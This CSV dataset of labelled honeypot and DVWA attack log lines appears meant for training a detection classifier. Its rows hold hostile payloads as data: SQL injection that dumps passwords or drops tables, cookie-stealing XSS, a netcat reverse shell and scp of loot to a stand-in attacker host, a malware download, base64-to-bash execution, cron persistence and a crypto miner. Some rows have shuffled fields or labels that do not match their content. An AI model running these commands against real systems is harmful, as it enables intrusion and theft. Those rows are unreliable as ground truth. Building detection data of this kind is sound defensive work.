text,label
"source:DVWA event:SQLi ip:91.112.55.133 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+(SELECT+COUNT(*)+FROM+users)>0--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.success ip:185.161.241.227 username:mongodb password:1234 command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:LOGIN ip:192.168.44.227 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:ls / request:-,SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:185.60.32.58 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fvar%2flog%2fauth.log HTTP/1.1""",RECON-DVWA
"source:DVWA event:SQLi ip:172.28.156.14 username:- command:- password:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+BENCHMARK(5000000,MD5(1))--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:45.162.4.126 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:91.89.211.191 username:- password:- command:echo '* * * * * root /tmp/bot.sh' >> /etc/crontab request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:ls /var request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:45.157.155.5 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+load_file('/etc/passwd'),null--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:cd /home request:-,SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:172.29.188.31 username:- password:- command:- request:""GET /dvwa/setup.php HTTP/1.1""",RECON-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:cat /etc/resolv.conf request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:172.29.24.50 username:- password:- command:iptables -X request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:103.216.55.138 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1;EXEC+xp_cmdshell('whoami')--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:103.108.231.169 username:- password:- command:- /dvwa/login.php request:""POST HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:91.9.124.216 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:192.168.32.10 username:- password:- command:history request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:192.168.244.137 username:root password:hello command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:91.188.68.163 username:- password:- command:cat /etc/crontab request:-,SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:103.213.163.8 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fetc%2fshadow HTTP/1.1""",RECON-DVWA
source:cowrie event:cowrie.command.input ip:91.3.151.129 username:- password:- command:chmod 777 /tmp/bot request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.failed ip:185.198.193.101 username:hadoop password:test command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.login.success ip:45.239.30.155 username:vault password:pass@123 command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.login.success ip:45.161.244.253 username:etcd password:default command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:SQLi ip:203.161.107.153 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+BENCHMARK(5000000,MD5(1))--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:10.66.224.122 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.success ip:172.26.42.162 username:uucp password:pass@123 command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.login.success ip:203.11.4.201 username:postgres password:qwerty command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:SQLi ip:172.27.96.187 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1;EXEC+xp_cmdshell('whoami')--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:203.128.252.143 username:- password:- command:systemctl enable backdoor request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+ORDER+BY+2+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:45.82.16.244 username:- password:- command:base64 -d <<< 'bWFsd2FyZQ==' | bash request:-,SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:203.97.25.159 username:- password:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fproc%2fnet%2ftcp HTTP/1.1""",RECON-DVWA
"source:cowrie event:cowrie.command.input username:- password:- command:python3 -c 'import pty;pty.spawn(""/bin/bash"")' request:-",SSH_COMMAND-COWRIE
"source:DVWA ip:203.72.154.2 username:- password:- command:- request:""GET /dvwa/.htaccess HTTP/1.1""",RECON-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+1%3d2+UNION+SELECT+username%2cpassword+FROM+users+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:172.27.49.159 username:- password:- command:chmod 777 /tmp/bot request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:172.24.72.26 username:- password:- command:- /dvwa/login.php HTTP/1.1""",RECON-DVWA
"source:DVWA event:RECON ip:172.16.13.199 username:- password:- command:- request:""GET /dvwa/?dvwaSecurityLevel=low HTTP/1.1""",RECON-DVWA
source:cowrie event:cowrie.login.failed ip:192.168.244.137 username:root password:root command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.login.success ip:203.39.114.41 username:oracle password:letmein command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:RECON ip:185.168.188.159 username:- password:- request:""GET command:- /dvwa/vulnerabilities/xss_r/?name=<img+src=x+onerror=alert(document.cookie)>&Submit=Submit HTTP/1.1""",XSS-DVWA
"source:DVWA event:SQLi ip:172.16.104.186 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1'+AND+SLEEP(5)--+&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input username:- password:- command:apt-get install -y netcat request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:45.150.76.252 username:- password:- command:ps -ef request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- command:- request:""GET HTTP/1.1"" /dvwa/vulnerabilities/sqli/?id=1%3b+DROP+TABLE+users+--&Submit=Submit",SQLI-DVWA
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:172.19.242.77 username:- password:- command:base64 -d <<< 'bWFsd2FyZQ==' | bash request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.failed ip:45.72.167.250 username:grafana password:michael command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:SQLi ip:203.17.94.100 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+INTO+OUTFILE+'/var/www/html/shell.php'--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:185.82.18.132 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+1=2+UNION+SELECT+table_name,null+FROM+information_schema.tables--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:192.168.73.250 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+ORDER+BY+3--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:91.192.158.182 username:- password:- command:cat /etc/crontab request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:185.209.138.64 username:lp password:solo command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.login.failed ip:91.150.33.65 username:gnats password:password123 command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.command.input ip:103.131.157.111 username:- password:- command:scp /tmp/loot.zip attacker@10.0.0.1:/tmp/ request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:185.5.88.214 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.failed ip:192.168.71.104 username:mongodb password:password123 command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:RECON ip:185.10.44.72 password:- command:- request:""GET /dvwa/vulnerabilities/exec/?ip=127.0.0.1%3buname+-a&Submit=Submit HTTP/1.1""",CMD_INJECTION-DVWA
"source:DVWA event:LOGIN ip:45.78.46.235 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:172.16.235.71 username:- password:- command:nc -e /bin/sh 10.0.0.1 4444 request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.success ip:10.137.146.65 username:uucp password:welcome1 command:- request:-,SSH_SUCCESS-COWRIE
"event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+1%3d1+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.success ip:185.225.34.108 username:nagios password:pass@123 command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:SQLi ip:45.33.131.73 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+1=CONVERT(int,@@version)--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:91.150.126.117 username:- password:- request:""POST command:- /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.failed ip:10.209.203.235 username:ansible password:monkey command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:cd /var/log request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:192.168.244.137 username:root password:P@ssword command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.9.217 username:- password:- command:echo '#!/bin/sh' > back.sh request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:185.199.114.110 username:- password:- command:find / -writable 2>/dev/null request:-,SSH_COMMAND-COWRIE
source:cowrie ip:185.175.225.5 username:- password:- command:scp /tmp/loot.zip attacker@10.0.0.1:/tmp/ request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:45.95.57.46 username:- password:- command:- /dvwa/login.php request:""POST HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:RECON ip:172.23.172.168 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fproc%2fself%2fcmdline HTTP/1.1""",CMD_INJECTION-DVWA
source:cowrie event:cowrie.command.input ip:103.16.45.198 username:- password:- command:apt-get install netcat -y request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:45.74.130.227 username:- password:- command:ps request:- -ef,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:10.83.150.102 username:- password:- command:ifconfig request:-,SSH_COMMAND-COWRIE
source:cowrie ip:192.168.244.137 event:cowrie.command.input username:- command:exit request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.success ip:172.25.190.25 username:ansible password:pass@123 command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:LOGIN ip:91.219.96.69 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.success ip:192.168.244.137 username:root password:P@ssword command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:LOGIN ip:103.65.37.168 username:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:10.143.218.238 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1'+AND+SLEEP(5)--+&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.session.connect ip:245.133.231.195 username:- password:- command:- request:-,RECON-COWRIE
"source:DVWA event:LOGIN ip:185.66.31.109 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:203.34.157.97 username:- password:- command:cat ~/.ssh/authorized_keys request:-,SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:103.36.165.197 username:- password:- command:- request:""GET /dvwa/vulnerabilities/xss_r/?name=<script>alert(1)</script>&Submit=Submit HTTP/1.1""",XSS-DVWA
source:cowrie event:cowrie.login.failed ip:91.52.160.129 password:dragon username:daemon command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.command.input ip:103.145.58.180 username:- password:- command:systemctl stop ufw request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:203.85.12.252 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+BENCHMARK(5000000,MD5(1))--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1%3b+DROP+TABLE+users+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:91.180.111.79 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+EXTRACTVALUE(1,CONCAT(0x7e,version()))--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.success ip:45.154.222.177 username:games password:password1 command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:103.123.5.222 username:- password:- command:./xmrig --donate-level 1 -o xmr.pool.minergate.com:45700 request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:91.215.84.178 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:203.234.108.24 username:- password:- command:(crontab -l; echo '*/5 * * * * /tmp/bot.sh') | crontab - request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:185.181.180.24 username:- password:- command:cp /bin/bash /tmp/.hidden_bash && chmod +s request:- /tmp/.hidden_bash,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:10.216.38.156 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+column_name,null+FROM+information_schema.columns+WHERE+table_name='users'--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:91.224.109.101 username:- password:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:RECON ip:45.71.26.57 username:- password:- command:- request:""GET /dvwa/vulnerabilities/xss_r/?name=<img+src=x+onerror=alert(document.cookie)>&Submit=Submit HTTP/1.1""",XSS-DVWA
source:cowrie event:cowrie.login.success ip:172.23.3.102 username:man password:passw0rd command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:SQLi ip:185.30.158.249 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+1,2,3--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.success ip:192.168.49.195 username:svn password:shadow request:- command:-,SSH_SUCCESS-COWRIE
"source:DVWA event:SQLi ip:91.148.28.81 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+1,2,3--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:192.168.33.73 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:45.47.163.214 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN password:- username:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:185.195.11.134 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:91.166.217.234 username:- password:- command:set request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:91.220.104.24 username:ubuntu password:princess command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:LOGIN ip:185.19.194.25 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.success ip:10.246.28.203 username:deploy password:000000 command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:10.114.54.140 username:- password:- command:ls -la /home request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:103.252.22.226 username:- password:- command:chmod +x shell.py request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.184.195 username:- password:- command:curl http://malware.com/bot -o /tmp/bot request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:185.222.134.254 username:- password:- command:nc -e 10.0.0.1 /bin/sh request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.failed ip:185.69.140.196 username:backup password:password123 command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:LOGIN ip:45.86.20.224 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:netstat -a request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:172.17.194.111 username:- password:- command:sh /tmp/payload.sh request:-,SSH_COMMAND-COWRIE
"event:RECON ip:91.173.142.125 username:- password:- command:- request:""GET /dvwa/vulnerabilities/exec/?ip=127.0.0.1%3buname+-a&Submit=Submit HTTP/1.1""",RECON-COWRIE
